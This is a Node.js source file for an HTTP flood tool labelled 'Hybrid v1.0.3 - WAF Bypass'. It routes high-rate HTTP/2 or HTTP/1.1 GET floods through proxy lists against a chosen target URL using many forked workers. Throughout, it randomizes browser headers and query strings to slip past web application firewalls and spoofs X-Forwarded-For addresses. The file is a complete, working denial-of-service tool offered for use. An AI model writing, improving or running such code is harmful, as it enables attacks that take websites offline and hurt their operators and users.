const net = require("net");
const http2 = require("http2");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const argv = require('minimist')(process.argv.slice(2));
const colors = require("colors");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function getRandomPrivateIP() {
    return `${randomIntn(10, 192)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(1, 255)}`;
}

function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (string.includes('\n')) {
        const lines = string.split('\n');
        lines.forEach(line => {
            console.log(`[${hours}:${minutes}:${seconds}]`.white + ` ${line}`);
        });
    } else {
        console.log(`[${hours}:${minutes}:${seconds}]`.white + ` ${string}`);
    }
}

function parseCommandLineArgs(args) {
    const parsedArgs = {};
    let currentFlag = null;

    for (const arg of args) {
        if (arg.startsWith('-')) {
            currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (currentFlag) {
            parsedArgs[currentFlag] = arg;
            currentFlag = null;
        }
    }
    return parsedArgs;
}

const _argv = process.argv.slice(2);
const argz = parseCommandLineArgs(_argv);

function parseHLineArgs(args) {
    const parsedArgs = {};
    const headers = {};

    for (let i = 0; i < args.length; i++) {
        const arg = args[i];

        if (arg.startsWith('-h')) {
            if (i + 1 < args.length && args[i + 1].includes('@')) {
                const [headerName, headerValue] = args[i + 1].split('@');
                const parsedValue = replaceRandPlaceholder(headerValue);
                headers[headerName] = parsedValue;
                i++;
            }
        } else if (arg.startsWith('-')) {
            const currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (arg.startsWith('--')) {
            const currentFlag = arg.slice(2);
            if (i + 1 < args.length && !args[i + 1].startsWith('-')) {
                parsedArgs[currentFlag] = args[i + 1];
                i++;
            } else {
                parsedArgs[currentFlag] = true;
            }
        }
    }
    return { args: parsedArgs, headers };
}

function replaceRandPlaceholder(value) {
    return value.replace(/%RAND-(\d+)%/g, (match, num) => randstr(parseInt(num)));
}

const _argh = process.argv.slice(2);
const { args: argh, headers: parsedHeaders } = parseHLineArgs(_argh);

class Messages {
    Alert() {
        log('Hybrid [ v1.0.3 - WAF Bypass ]')
        log('Credits - t.me/ardflood, t.me/shesh3n777rus, t.me/sentryapi')
        log('===========================================================')
    }
}

const messages = new Messages();

if (process.argv.length < 7) {
    messages.Alert()
    log('Usage: <url> <time> <threads> <rate> <proxy>')
    log('Arguments -')
    log(' -d <int any> [ delay before start new stream ]')
    log(' -v <int 1/2> [ http version ]')
    log(' -s [ use rate headers ]')
    log(' -e [ use extra headers ]')
    log('Settings -')
    log(' --log <text> [ enable log ]')
    log(' --debug [ enable debug ]')
    log(' --payload <text> [ send payload ]')
    log(' --query <text> [ querystring ]')
    log('Headers -')
    log(' -h <header@value> [ adding header ]')
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[5]),
    threads: parseInt(process.argv[4]),
    proxyFile: process.argv[6],
}

const delay = parseInt(argz["d"]) || 0;
const version = parseInt(argz["v"]) || 2;
const spoof = argz["s"];
const extra = argz["e"];

const _log = argv["log"];
const debug = argv["debug"];
const query = argv["query"];
const payload = argv["payload"];

const errorHandler = error => {
    if (debug) console.log(error);
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

var cipper = cplist[Math.floor(Math.random() * cplist.length)];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const headerBuilder = {
    userAgent: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    ],

    acceptLang: [
        'en-US,en;q=0.9',
        'en-GB,en;q=0.8',
        'ru-RU,ru;q=0.9,en;q=0.8',
        'fr-FR,fr;q=0.9,en;q=0.8',
        'de-DE,de;q=0.9,en;q=0.8',
        'es-ES,es;q=0.9,en;q=0.8',
    ],

    acceptEncoding: [
        'gzip, deflate, br',
        'gzip, br',
        'gzip, deflate'
    ],

    accept: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    ],

    Sec: {
        dest: ['document', 'empty'],
        site: ['none', 'same-origin'],
        mode: ['navigate', 'cors']
    }
}

const httpStatusCodes = {
    "200": { "Description": "OK", "Color": "brightGreen" },
    "301": { "Description": "Moved Permanently", "Color": "yellow" },
    "302": { "Description": "Found", "Color": "yellow" },
    "304": { "Description": "Not Modified", "Color": "yellow" },
    "400": { "Description": "Bad Request", "Color": "red" },
    "401": { "Description": "Unauthorized", "Color": "red" },
    "403": { "Description": "Forbidden", "Color": "red" },
    "404": { "Description": "Not Found", "Color": "red" },
    "500": { "Description": "Internal Server Error", "Color": "brightRed" },
    "502": { "Description": "Bad Gateway", "Color": "brightRed" },
    "503": { "Description": "Service Unavailable", "Color": "brightRed" }
};

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function buildDynamicHeaders() {
    let dynPath;
    if (query === '%RAND%') {
        const keyLen = randomIntn(6, 12);
        const valLen = randomIntn(10, 30);
        dynPath = parsedTarget.path + "?" + randstr(keyLen) + "=" + randstr(valLen);
    } else if (!query) {
        dynPath = parsedTarget.path;
    } else {
        dynPath = parsedTarget.path + "?" + query;
    }

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": dynPath
    };

    // Обязательные заголовки в правильном порядке
    headers["user-agent"] = randomElement(headerBuilder.userAgent);
    headers["accept"] = randomElement(headerBuilder.accept);
    headers["accept-language"] = randomElement(headerBuilder.acceptLang);
    headers["accept-encoding"] = randomElement(headerBuilder.acceptEncoding);
    
    // sec-fetch заголовки - случайно
    if (Math.random() > 0.3) {
        headers["sec-fetch-dest"] = randomElement(headerBuilder.Sec.dest);
        headers["sec-fetch-mode"] = randomElement(headerBuilder.Sec.mode);
        headers["sec-fetch-site"] = randomElement(headerBuilder.Sec.site);
    }
    
    // upgrade-insecure-requests - случайно
    if (Math.random() > 0.2) {
        headers["upgrade-insecure-requests"] = "1";
    }

    // cache-control - случайно
    if (Math.random() > 0.5) {
        headers["cache-control"] = "max-age=0";
    }

    // EXTRA
    if (extra) {
        if (Math.random() > 0.6) headers["dnt"] = Math.random() > 0.5 ? "1" : "0";
        if (Math.random() > 0.7) headers["viewport-width"] = randomIntn(1200, 1920).toString();
        if (Math.random() > 0.5) {
            headers["sec-ch-ua"] = `"Chromium";v="${randomIntn(124, 132)}", "Not)A;Brand";v="99"`;
            headers["sec-ch-ua-mobile"] = "?0";
            headers["sec-ch-ua-platform"] = randomElement(['"Windows"', '"macOS"', '"Linux"']);
        }
    }

    // SPOOF - только 1-2 заголовка
    if (spoof) {
        const spoofIP = getRandomPrivateIP();
        headers["x-forwarded-for"] = spoofIP;
        if (Math.random() > 0.7) {
            headers["x-real-ip"] = spoofIP;
        }
    }

    return headers;
}

function http2run() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            socket: connection,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 40,
                initialWindowSize: 65535,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 40,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    let requestHeaders;

                    if (Object.keys(parsedHeaders).length !== 0) {
                        let customPath;
                        if (query === '%RAND%') {
                            const keyLen = randomIntn(6, 12);
                            const valLen = randomIntn(10, 30);
                            customPath = parsedTarget.path + "?" + randstr(keyLen) + "=" + randstr(valLen);
                        } else if (!query) {
                            customPath = parsedTarget.path;
                        } else {
                            customPath = parsedTarget.path + "?" + query;
                        }

                        requestHeaders = {
                            ":method": "GET",
                            ":scheme": "https",
                            ":authority": parsedTarget.host,
                            ":path": customPath,
                            ...parsedHeaders
                        };
                    } else {
                        requestHeaders = buildDynamicHeaders();
                    }

                    const request = client.request(requestHeaders)
                        .on("response", response => {
                            const statusCode = response[':status'];

                            if (_log) {
                                if (httpStatusCodes[statusCode]) {
                                    const description = httpStatusCodes[statusCode].Description[httpStatusCodes[statusCode].Color];
                                    if (_log === true) {
                                        log(`${statusCode} ${description}`);
                                    } else if (statusCode === parseInt(_log)) {
                                        log(`${statusCode} ${description}`);
                                    }
                                }
                            }

                            if (payload === '%RAND%') {
                                request.write(randstr(25));
                            } else if (payload === '%BYTES%') {
                                request.write(crypto.randomBytes(64));
                            } else if (payload) {
                                request.write(payload);
                            }

                            request.close();
                            request.destroy();
                        });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

function http1run() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');

    var req = http.request({
        host: proxy[0],
        port: proxy[1],
        ciphers: cipper,
        method: 'CONNECT',
        path: parsedTarget.host + ":443"
    }, (err) => {
        req.end();
        return;
    });

    var queryString;
    if (query === '%RAND%') {
        queryString = parsedTarget.path + "?" + randstr(randomIntn(6, 12)) + "=" + randstr(randomIntn(10, 30));
    } else if (!query) {
        queryString = parsedTarget.path;
    } else {
        queryString = parsedTarget.path + "?" + query;
    }

    req.on('connect', function (res, socket, head) {
        var tlsConnection = tls.connect({
            host: parsedTarget.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method',
            servername: parsedTarget.host,
            secure: true,
            rejectUnauthorized: false,
            socket: socket
        }, function () {
            setInterval(() => {
                for (let j = 0; j < args.rate; j++) {
                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
                        "Host: " + parsedTarget.host + "\r\n" +
                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
                        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
                        `Accept-Language: ${randomElement(headerBuilder.acceptLang)}\r\n` +
                        "Connection: Keep-Alive\r\n\r\n";

                    tlsConnection.write(headers);
                }
            });
        });

        tlsConnection.on('error', function () {
            tlsConnection.end();
            tlsConnection.destroy();
        });
    });

    req.end();
}

if (cluster.isPrimary) {
    messages.Alert();

    if (version !== 1 && version !== 2) {
        log("ERROR".red + "  Invalid HTTP version. Available: 1, 2");
        process.exit();
    }

    log("INFO".cyan + "  Attack " + args.target + " started.");
    
    for (let i = 0; i < args.threads; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        log("INFO".cyan + "  Attack is over.");
        process.exit(1);
    }, args.time * 1000);

} else {
    if (version === 2) {
        setInterval(() => { http2run(); }, Number(delay) * 1000);
    } else if (version === 1) {
        setInterval(() => { http1run(); }, Number(delay) * 1000);
    }
}